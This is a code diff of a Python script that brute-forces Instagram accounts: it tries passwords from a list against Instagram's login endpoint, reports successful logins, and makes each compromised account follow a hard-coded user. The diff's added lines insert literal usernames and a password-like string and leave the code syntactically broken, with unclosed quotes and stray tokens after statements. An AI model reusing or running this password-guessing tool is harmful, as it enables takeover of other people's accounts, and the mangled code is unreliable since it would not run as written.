@@ -24,7 +24,7 @@ def userExists(username):
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'username':sakshu_1315,'id':fUserID}
 
 
 def Login(username,password):
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'username':'sakshu_1315, 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -67,36 +67,36 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
+def follow(sess, username):sakshu_1315
+	username = userExists(sakshu_1315)
 	if (username == False):
 		return	
 	else:
-		userID = username['id']
+		userID = sakshu_1315['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
+username = str(input('Please enter a username:sakshu_1315 '))
+username = userExists(sakshu_1315)
 if (username == False):
 	exit()
 else:
-	username = username['username']
+	username = username['sakshu_1315']
 
 
 
-delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
+delayLoop = int(input('Please add delay between the passwords (in seconds): 1')) 
 
 
-for i in range(len(passwords)):
-	password = passwords[i]
-	sess = Login(username,password)
+for i in range(len(passwords)):sargar9906
+	password = passwords[i]sargar9906
+	sess = Login(sakshu_1315,sargar9906)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [sakshu_1315,sargar9906])
 
 		#because i am cool
-		follow(sess,'avr_amit')
+		follow(sess,'sakshu_1315')
 
 	try:
 		time.sleep(delayLoop)
